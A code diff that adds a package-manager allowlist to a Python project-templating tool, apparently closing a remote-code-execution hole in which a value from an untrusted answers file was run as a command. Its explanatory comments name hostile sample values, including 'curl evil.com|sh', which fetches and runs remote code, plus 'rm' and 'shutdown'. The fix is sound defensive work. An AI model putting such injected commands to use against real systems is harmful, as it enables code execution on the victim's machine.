@@ -15,7 +15,35 @@ import subprocess
 import sys
 from pathlib import Path
 
-from .errors import HookExecutionError, TaskExecutionError
+from .errors import HookExecutionError
+
+
+# SE-P1-1: 包管理器白名单 — 防止恶意 answers (--from-answers from untrusted) 注入
+# 任意命令名 (如 pm='rm' / 'curl evil.com|sh' / 'shutdown')。白名单是单一执行源,
+# 与 ae-template.yml choices 一致, 任何添加/删除 PM 须同步更新两端。
+_ALLOWED_PACKAGE_MANAGERS = frozenset({
+    "npm", "pnpm", "yarn", "bun",  # Node.js
+    "uv", "poetry", "pip",          # Python
+    "cargo",                         # Rust
+})
+
+
+def _validate_package_manager(pm: str) -> None:
+    """SE-P1-1: pm 必须在白名单内 — 不在白名单直接拒绝, 不调用 subprocess.
+
+    Why: 之前 [pm, 'install'] 直接以 pm 为 argv[0], 攻击者可在 answers 文件
+    中设置 package_manager='rm' 或 'curl evil.com' 触发 RCE.
+    """
+    if pm not in _ALLOWED_PACKAGE_MANAGERS:
+        raise HookExecutionError(
+            command=f"{pm} install",
+            exit_code=-1,
+            stderr=(
+                f"package_manager='{pm}' 不在白名单内 (SE-P1-1)."
+                f"允许: {sorted(_ALLOWED_PACKAGE_MANAGERS)}."
+                f"如需新增 PM, 请同时更新 _ALLOWED_PACKAGE_MANAGERS 与 ae-template.yml choices."
+            ),
+        )
 
 
 def _has_package_file(tmpdir: Path, pm: str) -> bool:
@@ -92,6 +120,8 @@ def run_builtin_hooks(answers, tmpdir: Path, strict: bool = False, quiet: bool =
 
     pm = answers.get("package_manager")
     if pm and _has_package_file(tmpdir, pm):
+        # SE-P1-1: 拒绝非白名单 PM (防 RCE via 恶意 answers 文件)
+        _validate_package_manager(pm)
         try:
             result = subprocess.run([pm, "install"], cwd=tmpdir, capture_output=True, text=True,
                                      encoding="utf-8", errors="replace")
